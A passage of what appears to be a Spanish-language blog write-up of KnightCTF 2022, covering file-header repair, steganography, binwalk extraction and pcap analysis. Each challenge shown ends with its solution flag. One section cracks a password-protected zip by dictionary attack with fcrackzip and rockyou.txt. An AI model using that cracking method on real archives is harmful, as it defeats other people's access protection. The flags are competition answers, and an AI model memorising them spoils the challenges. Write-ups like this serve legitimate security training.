&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;misc&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Misc&lt;/h3&gt;

&lt;h4 id=&quot;unzip-me&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;Unzip Me&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/24.png&quot; alt=&quot;24&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Al descomprimir el archivo &lt;a href=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/unzipme.tar.gz&quot;&gt;unzipme.tar.gz&lt;/a&gt;, extraeremos un archivo que lleva por nombre &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unzipme&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;El propio nombre del archivo nos sugiere que debemos de descomprimirlo, sin embargo, no conocemos en que formato está comprimido; podríamos hacer uso del comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file&lt;/code&gt;, pero nos dirá que simplemente se trata de &lt;em&gt;data&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;Como no conocemos el formato del archivo, podríamos visualizar su contenido en &lt;em&gt;hexadecimal&lt;/em&gt; haciendo uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xxd&lt;/code&gt;, para así conseguir su &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;magic number&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;xxd unzipme
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/25.png&quot; alt=&quot;25&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si nos percatamos, cada pareja de dígitos está dada la vuelta; es decir, la forma correcta de los cuatro primeros dígitos debería ser &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;504B 0304&lt;/code&gt;, esto corresponde con el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;magic number&lt;/code&gt; de los archivos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PKZip&lt;/code&gt;. Tenemos una lista completa de &lt;em&gt;magic numbers&lt;/em&gt;, de varios tipos de archivos, &lt;a href=&quot;https://asecuritysite.com/forensics/magic&quot;&gt;aquí&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;De este modo, haciendo uso de &lt;a href=&quot;https://gchq.github.io/CyberChef/&quot;&gt;CyberChef&lt;/a&gt;, podemos descomprimir el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unzipme&lt;/code&gt;. Lo primero que haremos será indicar que queremos trabajar con el formato &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hexdump&lt;/code&gt;, y posterior a ello introduciremos el output conseguido con el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xxd&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/26.png&quot; alt=&quot;26&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Luego de esto, indicaremos que queremos cambiar el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;endianness&lt;/code&gt; cada &lt;em&gt;2 bytes&lt;/em&gt;, para finalmente descomprimir el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unzipme&lt;/code&gt; y conseguir la flag.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/27.png&quot; alt=&quot;27&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;KCTF{sO_yOu_sWaPP3D_tHe_f1L3}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;look-closely&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;Look Closely&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/28.png&quot; alt=&quot;28&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Para este reto se nos da un archivo &lt;a href=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/look%20closely.wav&quot;&gt;.wav&lt;/a&gt;, del cual no logramos identificar nada. Lo que podemos hacer es visualizar el espectrograma con herramientas como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Audacity&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo apt install audacity
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/29.png&quot; alt=&quot;29&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://drive.google.com/file/d/1_6c_waS9ijouTpqI_tUO6VCRf7fE6gCY/view?usp=sharing
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;En el enlace encontraremos un video que aparte de verse fatal, contiene dos cadenas de caracteres escritas en binario.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/30.png&quot; alt=&quot;30&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;01001011 01000011 01010100 01000110 01111011 01001000 00110011
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/31.png&quot; alt=&quot;31&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;01001100 01001100 01001111 01011111 01001010 00110011 01001100 01001100 01001111 01111101 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez las unimos, y &lt;a href=&quot;https://gchq.github.io/CyberChef/#recipe=From_Binary(&apos;Space&apos;,8)&quot;&gt;traducimos&lt;/a&gt; obtenemos la flag.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;KCTF{H3LLO_J3LLO}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;digital-forensics&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Digital Forensics&lt;/h3&gt;

&lt;h4 id=&quot;the-lost-flag&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;The Lost Flag&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/32.png&quot; alt=&quot;32&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A la hora de abrir el &lt;a href=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/Lost%20Flag%20.png&quot;&gt;archivo adjunto&lt;/a&gt; no vamos a encontrar nada sospechoso a primera vista.&lt;/p&gt;

&lt;p&gt;No obstante, si utilizamos herramientas como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;StegSolve&lt;/code&gt; o &lt;a href=&quot;https://29a.ch/photo-forensics/&quot;&gt;Forensically&lt;/a&gt;, vamos a poder visualizar la flag.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget http://www.caesum.com/handbook/Stegsolve.jar -O stegsolve.jar
chmod +x stegsolve.jar
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/33.png&quot; alt=&quot;33&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;KCTF{Y0U_F0UND_M3}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;unknown-file&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;Unknown File&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/34.png&quot; alt=&quot;34&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Al descomprimir el &lt;a href=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/unknown file.zip&quot;&gt;archivo adjunto&lt;/a&gt;, extraeremos un archivo que lleva por nombre &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unknown file&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Así como el enunciado sugiere, no se sabe ante que tipo de archivo nos estamos enfrentando, por lo que comandos como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file&lt;/code&gt;, no nos serán de utilidad. Lo que podemos hacer es visualizar el contenido del archivo en &lt;em&gt;hexadecimal&lt;/em&gt; haciendo uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xxd&lt;/code&gt;, para así conseguir su &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;magic number&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;xxd unknown\ file | head
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/35.png&quot; alt=&quot;35&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si nos percatamos, el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;magic number&lt;/code&gt; no corresponde con &lt;a href=&quot;https://asecuritysite.com/forensics/magic&quot;&gt;ninguno conocido&lt;/a&gt;, sin embargo, podemos observar una sección que dice &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IHDR&lt;/code&gt;, el cual corresponde con uno de los &lt;em&gt;chunks&lt;/em&gt; principales de cualquier imagen &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PNG&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;De modo que reemplazando los cuatro primeros dígitos con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;89 50 4E 47&lt;/code&gt;, conseguiremos visualizar la flag; esto podemos hacerlo mediante herramientas online como &lt;a href=&quot;https://www.onlinehexeditor.com/&quot;&gt;Online Hex Editor&lt;/a&gt;, o &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ghex&lt;/code&gt;, que para instalarlo es bastante sencillo:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo apt install ghex
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/36.png&quot; alt=&quot;36&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;KCTF{Imag3_H3ad3r_M4nipul4t10N}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;lets-walk-together&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;Let’s Walk Together&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/37.png&quot; alt=&quot;37&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Al abrir el &lt;a href=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/interesting_waves.png&quot;&gt;archivo adjunto&lt;/a&gt; no vamos a observar nada relevante, no obstante, el nombre del reto nos da una pista bastante importante. Vamos a hacer uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;binwalk&lt;/code&gt;, una herramienta de &lt;em&gt;ingeniería inversa&lt;/em&gt; dedicada a identificar archivos y código malicioso en &lt;em&gt;imágenes de firmware&lt;/em&gt;.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;binwalk -e interesting_waves.png
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Se nos creará una carpeta dentro de la cual estará todo lo que se encontraba dentro de la imagen; entre ello, un archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.zip&lt;/code&gt; protegido por contraseña.&lt;/p&gt;

&lt;p&gt;En vista de que no tenemos ningún indicio de ninguna contraseña, aplicaremos fuerza bruta sobre el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.zip&lt;/code&gt; mediante &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fcrackzip&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo apt install fcrackzip
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Para ello necesitaremos de algún diccionario, el más común es &lt;a href=&quot;https://objects.githubusercontent.com/github-production-release-asset-2e65be/97553311/d4f580f8-6b49-11e7-8f70-7f460f85ab3a?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;amp;X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20220209%2Fus-east-1%2Fs3%2Faws4_request&amp;amp;X-Amz-Date=20220209T031834Z&amp;amp;X-Amz-Expires=300&amp;amp;X-Amz-Signature=d8b079596701be0a466831ad31ee5cc654d2cc6b43291d532f275e51b6e480fb&amp;amp;X-Amz-SignedHeaders=host&amp;amp;actor_id=79855501&amp;amp;key_id=0&amp;amp;repo_id=97553311&amp;amp;response-content-disposition=attachment%3B%20filename%3Drockyou.txt&amp;amp;response-content-type=application%2Foctet-stream&quot;&gt;rockyou.txt&lt;/a&gt;.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;fcrackzip -D -p /ruta/del/diccionario/rockyou.txt -u 11150.zip
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;-D - Indicamos que queremos hacer un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ataque de diccionario&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;-p - Indicamos el diccionario&lt;/li&gt;
  &lt;li&gt;-u - Nos quedamos solamente con la contraseña correcta; descartamos falsos positivos&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/38.png&quot; alt=&quot;38&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ya con la contraseña del &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.zip&lt;/code&gt;, podemos extraer el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag.txt&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;KCTF{BiNw4lk_is_h3lpfUl}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;networking&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Networking&lt;/h3&gt;

&lt;h4 id=&quot;compromised-ctf-platform&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;Compromised CTF Platform&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/39.png&quot; alt=&quot;39&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Se nos da una &lt;a href=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/traffic.pcapng&quot;&gt;captura de tráfico&lt;/a&gt; que bien podemos analizar con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TShark&lt;/code&gt; o &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wireshark&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/40.png&quot; alt=&quot;40&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;En este caso, como se nos pide averiguar por un nombre de usuario y contraseña, lo más sensato sería filtrar la captura por peticiones de tipo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;POST&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http.request.method == POST
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/41.png&quot; alt=&quot;41&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si empezamos a revisar cada petición, veremos que el atacante probó credenciales típicas como &lt;em&gt;admin/admin&lt;/em&gt;, &lt;em&gt;admin/admin123&lt;/em&gt;, &lt;em&gt;test/test&lt;/em&gt;, &lt;em&gt;admin/password&lt;/em&gt; devolviendo siempre el servidor un mensaje &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Invalid Username or Password&lt;/code&gt;, hasta que da con las credenciales correctas, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;demo/demo&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;KCTF{demo_demo}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;robotstxt&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;Robots.txt&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/42.png&quot; alt=&quot;42&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como estamos en búsqueda del archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;robots.txt&lt;/code&gt;, podemos filtrar la &lt;a href=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/traffic.pcapng&quot;&gt;captura de tráfico&lt;/a&gt; por peticiones de tipo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GET&lt;/code&gt;, y posteriormente por todas aquellas que mencionen el archivo que buscamos, esto último lo podemos hacer con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CTRL + F&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http.request.method == GET
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/43.png&quot; alt=&quot;43&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/44.png&quot; alt=&quot;44&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;KCTF{/includes/users.php}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;php-version&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;PHP Version&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/45.png&quot; alt=&quot;45&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Este reto era bastante sencillo, podíamos completarlo a medida que realizábamos otros retos. La versión de PHP podemos visualizarla en cualquier petición que se realice al servidor.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/46.png&quot; alt=&quot;46&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;KCTF{PHP/7.4.27}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;kctf&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;KCTF&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/47.png&quot; alt=&quot;47&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Para este reto no se nos da mayor contexto, sin embargo, si analizamos los objetos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; encontraremos una imagen que contiene la flag.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/48.png&quot; alt=&quot;48&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/49.png&quot; alt=&quot;49&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;KCTF{Ev3rY_USEr_1nPuT_SH0uLD_B3_S4niT1z3D}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;admin-arena&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;Admin Arena&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/50.png&quot; alt=&quot;50&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nuevamente tenemos que filtrar de la &lt;a href=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/traffic.pcapng&quot;&gt;captura de tráfico&lt;/a&gt;, información que viaja por &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;POST&lt;/code&gt;, en este caso, en la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Admin Arena&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http.request.method == POST
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/51.png&quot; alt=&quot;51&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;KCTF{tareq@hackerzarena.com_P@$$w0Rd}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;vuln&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;Vuln&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/52.png&quot; alt=&quot;52&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A partir de este punto, los retos van enfocados al ataque que se realizó en contra de la plataforma de CTF. Si hemos estado atentos a las diversas peticiones &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; que se realizaron, nos habremos percatado que hay varias bastante sospechosas.&lt;/p&gt;

